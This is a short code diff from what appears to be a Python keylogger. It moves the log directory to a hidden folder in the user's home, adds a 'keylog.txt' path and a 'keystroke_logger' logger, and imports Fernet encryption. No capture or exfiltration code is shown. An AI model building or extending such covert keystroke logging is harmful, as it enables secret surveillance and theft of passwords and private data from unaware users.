@@ -3,8 +3,11 @@ import os
 from cryptography.fernet import Fernet
 import os
 
-log_dir = "/Users/mannatvirk/.hiddenfolder"
+log_dir = os.path.join(os.path.expanduser("~"), ".hiddenfolder")
 os.makedirs(log_dir, exist_ok=True)
+
+log_file_path = os.path.join(log_dir, "keylog.txt")
+keystroke_logger = logging.getLogger('keystroke_logger')
 
 def setup_logger(name, filename, level=logging.INFO, fmt='%(asctime)s: %(message)s'):
     logger = logging.getLogger(name)
